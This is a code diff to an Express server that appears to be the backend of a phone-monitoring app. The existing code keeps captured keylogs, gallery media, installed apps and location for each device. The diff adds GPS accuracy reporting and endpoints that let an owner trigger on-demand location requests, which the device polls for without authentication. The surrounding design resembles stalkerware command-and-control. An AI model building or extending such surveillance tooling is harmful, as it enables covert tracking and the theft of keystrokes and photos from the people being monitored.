@@ -122,10 +122,11 @@ const keylogs = [];
 const deviceUIs = new Map();
 const galleryData = new Map();
 const galleryRequestFlags = new Map();
+const gpsRequestFlags = new Map();
 
 app.post("/api/device-state", async (req, res) => {
   try {
-    const { ownerEmail, deviceId, deviceToken, deviceName, battery, installedApps, latitude, longitude } = req.body;
+    const { ownerEmail, deviceId, deviceToken, deviceName, battery, installedApps, latitude, longitude, accuracy } = req.body;
     if (!ownerEmail || !deviceId || !deviceToken) return res.status(400).json({ error: "ownerEmail, deviceId, deviceToken required" });
 
     const userRes = await pool.query("SELECT id FROM users WHERE email=$1", [ownerEmail.toLowerCase().trim()]);
@@ -151,6 +152,7 @@ app.post("/api/device-state", async (req, res) => {
       installedApps: installedApps || [],
       latitude: latitude ?? null,
       longitude: longitude ?? null,
+      accuracy: accuracy ?? null,
       last_seen: Date.now()
     });
     res.json({ success: true });
@@ -165,7 +167,7 @@ app.get("/api/device-state", requireLogin, async (req, res) => {
     return res.status(403).json({ error: "Not your device." });
   }
   const live = deviceStates.get(deviceId);
-  if (!live) return res.json({ deviceName: "Unknown", battery: 0, installedApps: [], latitude: null, longitude: null, last_seen: 0 });
+  if (!live) return res.json({ deviceName: "Unknown", battery: 0, installedApps: [], latitude: null, longitude: null, accuracy: null, last_seen: 0 });
   res.json(live);
 });
 
@@ -276,6 +278,26 @@ app.get("/api/gallery", requireLogin, async (req, res) => {
   }
   const media = galleryData.get(deviceId) || [];
   res.json({ media });
+});
+
+// ================= GPS REQUEST =================
+app.post("/api/gps/request", requireLogin, async (req, res) => {
+  const { deviceId } = req.body;
+  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+  const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
+  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
+    return res.status(403).json({ error: "Not your device." });
+  }
+  gpsRequestFlags.set(deviceId, true);
+  res.json({ success: true });
+});
+
+app.get("/api/gps/request", async (req, res) => {
+  const { deviceId } = req.query;
+  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+  const requested = gpsRequestFlags.get(deviceId) || false;
+  if (requested) gpsRequestFlags.delete(deviceId);
+  res.json({ requested });
 });
 
 // ================= PAGES =================
